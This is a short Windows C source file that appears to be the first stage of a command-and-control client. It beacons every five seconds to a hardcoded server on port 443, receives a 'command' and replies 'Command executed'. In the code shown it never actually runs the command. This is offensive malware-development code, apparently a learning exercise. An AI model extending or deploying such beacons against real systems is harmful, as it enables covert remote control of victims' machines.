/* *
 * gcc -o stage1_client.exe stage1_client.c -lws2_32 -liphlpapi -lpsapi
 *
 * */

#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_IP "10.0.0.86"  // Localhost for testing
#define SERVER_PORT 443

void connect_to_c2() {
	WSADATA wsa;
	SOCKET sock;
	struct sockaddr_in server;

	// Initialize Winsock
	WSAStartup(MAKEWORD(2,2), &wsa);

	// Create socket
	sock = socket(AF_INET, SOCK_STREAM, 0);

	// Setup server address
	server.sin_addr.s_addr = inet_addr(SERVER_IP);
	server.sin_family = AF_INET;
	server.sin_port = htons(SERVER_PORT);

	// Connect to netcat server
	if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
		printf("Failed to connect to server\n");
		return;
	}

	printf("Connected to C2 server!\n");

	// Send beacon message
	send(sock, "Client checking in\n", 19, 0);

	// Wait for command from netcat
	char buffer[1024] = {0};
	int recv_size = recv(sock, buffer, sizeof(buffer), 0);

	if (recv_size > 0) {
		printf("Received command: %s\n", buffer);

		// Send response back
		send(sock, "Command executed\n", 17, 0);
	}

	closesocket(sock);
	WSACleanup();
}

int main() {
	while (1) {
		connect_to_c2();
		Sleep(5000);  // Beacon every 5 seconds
	}
	return 0;
}
